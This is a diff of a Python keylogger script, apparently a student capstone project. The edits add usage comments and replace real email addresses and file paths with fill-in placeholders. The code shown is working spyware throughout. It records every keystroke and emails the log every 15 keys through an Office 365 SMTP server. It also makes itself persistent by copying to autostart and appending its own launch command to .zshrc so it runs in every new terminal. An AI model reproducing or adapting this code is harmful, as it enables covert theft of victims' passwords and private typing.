@@ -5,7 +5,7 @@ import sys
 
 subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
 
-import getpass
+import getpass #used for password secrecy 
 import smtplib
 import ssl
 import time
@@ -23,11 +23,11 @@ print('''8888888b.                    888    888               888              
 8888888P"   "Y8888  "Y888888  "Y888 888  888  88888P'  "Y888 888     "Y88P"  888  888  "Y8888P" ''')
 
 count = 0
-subject = "keylogger"
-full_log = '\n'
+subject = "keylogger" #can be changed to your liking
+full_log = '\n' #without this log will be sent in the header instead of the body of the email 
 message = 'Subject:' + subject + full_log
-sender_email = 'neededaname1@outlook.com'
-receiver_email = 'neededaname1@outlook.com'
+sender_email = 'insert your email'
+receiver_email = 'insert your email'
 email = input('Enter email:')
 password = getpass.getpass(prompt='Welcome Slade:', stream=None)
 port = 587
@@ -38,18 +38,17 @@ smtp_server = "smtp.office365.com"
 def timed_log():
     if len(full_log) >= 15:
         send_email()
-        time.sleep(10)
+        time.sleep(10) #time is in seconds
 
 #Email
 def send_email():
     global full_log
-    global message 
-    if len(full_log) >= 10:
+    if len(full_log) >= 15:
         try: 
             server = smtplib.SMTP(smtp_server, port)
-            server.ehlo()
+            server.ehlo() #optional
             server.starttls(context=context)
-            server.ehlo()
+            server.ehlo() #optional
             server.login(sender_email, password)
             print(' Successful login! ')
             server.sendmail(sender_email, receiver_email,full_log)
@@ -67,7 +66,7 @@ def on_press(key):
   full_log += str(key)
   count += 1
 
-#Every 20 keys typed by user txt file is updated
+#Every 15 keys typed by user string is updated
 #Can be any number
   if count >= 15:
     count = 0
@@ -76,12 +75,11 @@ def on_press(key):
     timed_log()
     
     if count == 0:
-        full_log = '\n'
+        full_log = '\n' #Without you'll receieve a blank email
 
 
 
 #When  key is released
-#Breaks loop if we hit the escape key
 def on_release(key):
   if key==Key.esc:
     return my_bool
@@ -93,7 +91,7 @@ def persistence():
     shutil.copy(terminal_path, autostart_path)
 
     file_location = "/home/kali/.zshrc"
-    command = "/home/kali/Documents/Capstone/Deathstrok3/Keylogger.py"
+    command = "filepath of your keylogger.py download"
     
     # Open .zshrc file and check for entry for script
     with open(file_location) as file:
@@ -109,11 +107,11 @@ def persistence():
 def append_command():
     # Add entry into .zshrc file
     file_location = "/home/kali/.zshrc"
-    command = "/home/kali/Documents/Capstone/Deathstrok3/Keylogger.py"
+    command = "filepath of your keylogger.py download"
 
     with open(file_location, "a") as file:
         file.write(command)
-
+#keylogger runs on every new terminal opened
 persistence()
     
 #Will continously loop through until broken
